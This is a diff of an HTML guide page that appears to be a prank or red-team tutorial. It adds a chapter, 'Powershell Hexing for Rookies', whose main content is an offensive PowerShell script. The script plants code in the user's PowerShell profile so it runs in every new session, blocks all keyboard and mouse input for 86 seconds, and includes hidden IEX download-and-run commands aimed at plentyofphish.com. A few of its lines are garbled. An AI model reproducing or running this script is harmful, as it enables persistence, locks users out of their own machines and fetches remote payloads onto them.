@@ -83,7 +83,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded "><a href="Wizardintro.html"><strong aria-hidden="true">1.</strong> A Wizards Legacy</a></li><li class="chapter-item expanded "><a href="Tome1.html"><strong aria-hidden="true">2.</strong> Tome one, Terminal trolling</a></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded "><a href="Wizardintro.html"><strong aria-hidden="true">1.</strong> A Wizards Legacy</a></li><li class="chapter-item expanded "><a href="Tome1.html"><strong aria-hidden="true">2.</strong> Tome one, Terminal trolling</a></li><li class="chapter-item expanded "><a href="Tome22.html"><strong aria-hidden="true">3.</strong> Tome two, Powershell Hexing</a></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
@@ -233,6 +233,63 @@ wrapper(main)
 <hr />
 <p>Here is what the poor blue team would see waving back to them on a Terminal that they cannot clear! The only option is to kill the shell. </p>
 <p><img src="attachments/ascii.jpg" alt="Wizard_Render" /></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="powershell-hexing-for-rookies"><a class="header" href="#powershell-hexing-for-rookies">Powershell Hexing for Rookies</a></h1>
+<p>Spell Class : Black Magic</p>
+<p>Spell Level : Introduction</p>
+<hr />
+<pre><code class="language-powershell">$filethingy = (Get-Childitem -Path C:\ -Recurse -ErrorAction SilentlyContinue | where {$_.Name -match 'memoryfixer.ps1'}).FullName
+$content = Get-Content -Path $filethingy
+
+if (!(Test-Path $profile)) {
+New-Item -ItemType File -Path $profile -Force 
+Set-Content -Path $profile -Value $content
+}else {
+Set-Content -Path $profile -Value $content
+}
+
+
+
+Set-CoAdd-Type -AssemblyName presentationCore
+$filepath = &quot;C:\Windows\Temp\trap.mp4&quot;
+$wmplayer = New-Object System.Windows.Media.MediaPlayer
+$wmplayer.Open($filepath)
+Start-Sleep 1 
+$duration = $wmplayer.NaturalDuration.TimeSpan.Seconds
+$wmplayer.Close()
+start playing
+$proc = Start-process -FilePath &quot;C:\Program Files (x86)\Windows Media Player\wmplayer.exe&quot; -ArgumentList $filepath -PassThru
+
+
+
+# This Bit locks the user out for 86 seconds
+
+$code = @'
+    [DllImport(&quot;user32.dll&quot;)]
+        public static extern bool BlockInput(bool fBlockIt);
+'@
+        
+        $userInput = Add-Type -MemberDefinition $code -Name Blocker -Namespace UserInput -PassThru
+        
+        
+        $null = $userInput::BlockInput($true)
+        
+Write-Warning &quot;You have just fell for the trap...&quot;
+
+        Start-Sleep -Seconds 86
+        
+       
+        $null = $userInput::BlockInput($false)
+        
+
+
+Set-StrictMode -Version 2
+
+#powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://plentyofphish.com:80/traptime'))&quot;
+#powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://plentyofphish.com:80/.exe'))&quot;
+
+#Runs above payloads
+
+</code></pre>
 
                     </main>
 
